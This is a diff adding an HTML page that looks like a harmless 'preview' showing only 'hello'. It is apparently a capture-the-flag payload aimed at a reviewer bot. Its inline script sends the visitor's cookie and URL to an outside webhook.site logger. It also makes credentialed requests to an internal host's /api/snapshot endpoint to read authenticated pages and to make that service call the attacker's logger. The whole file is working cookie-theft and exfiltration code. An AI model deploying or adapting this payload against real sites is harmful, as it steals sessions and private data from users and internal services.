@@ -1,0 +1,23 @@
+<!doctype html><html><head><meta charset="utf-8"><title>preview</title></head>
+<body><h1>hello</h1>
+<script>
+var WH="https://webhook.site/e6fac3d4-991c-4ccb-a0e1-4aaa4014a9e4/";
+function B(tag,data){data=(""+(data||"")).slice(0,1600);
+  try{new Image().src=WH+tag+"?d="+encodeURIComponent(data);}catch(e){}
+  try{navigator.sendBeacon(WH+tag,data);}catch(e){}}
+B("00-js-ran","href="+location.href+" | cookie="+document.cookie);
+var W="http://web:3000";
+// A) cross-origin READ of authenticated home (expect CORS block)
+fetch(W+"/",{credentials:"include"}).then(r=>r.text())
+ .then(t=>B("A-read-home-OK",t)).catch(e=>B("A-read-home-FAIL",e));
+// B) reviewer-authed /api/snapshot of an INTERNAL page, try to READ result (if CORS permissive -> FLAG screenshot dataUrl)
+fetch(W+"/api/snapshot",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({url:W+"/"})}).then(r=>r.text())
+ .then(t=>B("B-snap-internal-READ",t)).catch(e=>B("B-snap-internal-FAIL",e));
+// C) fire-and-forget snapshot pointed at OUR logger -> does snapshot service leak reviewer cookie to us?
+fetch(W+"/api/snapshot",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({url:WH+"C-SNAP-CALLBACK"}),mode:"no-cors"}).then(()=>B("C-snap-ourlogger-sent","ok")).catch(e=>B("C-snap-fail",e));
+// D) confirm no-cors reachability of snapshot endpoint (status opaque)
+fetch(W+"/api/snapshot",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({url:W+"/"}),mode:"no-cors"}).then(r=>B("D-snap-nocors-type",r.type)).catch(e=>B("D-snap-nocors-fail",e));
+</script></body></html>
